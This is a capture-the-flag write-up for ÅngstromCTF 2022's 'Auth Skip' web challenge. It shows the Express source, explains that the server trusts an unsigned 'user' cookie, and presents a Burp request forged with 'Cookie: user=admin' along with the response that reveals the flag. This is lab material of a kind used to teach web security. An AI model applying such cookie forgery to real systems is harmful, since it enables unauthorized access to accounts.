+++
title = "ÅngstromCTF2022 - Auth Skip "
date = "2022-05-05"
weight = 0

[taxonomies]
tags=["web", "cookie", "auth", "ctf"]
ctf=["ÅngstromCTF"]
+++

# Auth Skip

Goal is to do the legendary "Auth Skip", like in true speedrunner fashion, finding an exploit, getting those gold splits, conquering the leaderboard!

Given the source code, i began to look at the logic of the cookies used for authentication.

```javascript
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.post("/login", (req, res) => {
    if (
        req.body.username !== "admin" ||
        req.body.password !== Math.random().toString()
    ) {
        res.status(401).type("text/plain").send("incorrect login");
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
    }
});

app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

The vuln lies in the following lines:

```javascript
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
```


We can set our cookie to something like, `user=admin`  and we can ommit the password, as it doesn't require us to provide one.

Thus we navigate to `/` providing the username and cookie we should be able to grab the flag:

```javascript
app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
```

--- 

# Exploit: Legendary Auth Skip
In burp I intercepted:

```
GET / HTTP/2
Host: auth-skip.web.actf.co
Sec-Ch-Ua: [...]
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: [...]
Accept: [...]
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Simply add the cookie to the request

```
Cookie: user=admin
```

et voilà !

```
HTTP/2 200 OK
Date: Wed, 04 May 2022 14:44:26 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 54
X-Powered-By: Express
Etag: W/"36-QSBEGde8h39PljsFBY/epRs/oqo"
Strict-Transport-Security: max-age=15724800; includeSubDomains

actf{passwordless_authentication_is_the_new_hip_thing}
```

*aut viam inveniam aut faciam*

